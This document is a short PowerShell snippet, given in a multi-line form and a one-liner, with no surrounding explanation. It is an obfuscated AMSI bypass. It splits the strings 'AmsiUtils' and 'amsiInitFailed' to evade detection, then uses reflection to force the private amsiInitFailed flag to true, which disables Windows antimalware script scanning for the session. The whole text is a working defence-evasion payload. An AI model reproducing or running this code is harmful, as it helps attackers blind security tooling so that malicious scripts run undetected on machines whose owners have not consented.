$a = 'System.Management.Automation.A';$b = 'ms';$u = 'Utils'
$assembly = [Ref].Assembly.GetType(('{0}{1}i{2}' -f $a,$b,$u))
$field = $assembly.GetField(('a{0}iInitFailed' -f $b),'NonPublic,Static')
$me = $field.GetValue($field)
$me = $field.SetValue($null, [Boolean]"hhfff")

---------------------------------------------------------------------------------------

$a='System.Management.Automation.A';$b='ms';$u='Utils';$assembly=[Ref].Assembly.GetType(('{0}{1}i{2}' -f $a,$b,$u));$field=$assembly.GetField(('a{0}iInitFailed' -f $b),'NonPublic,Static');$field.SetValue($null,[Boolean]'hhfff')


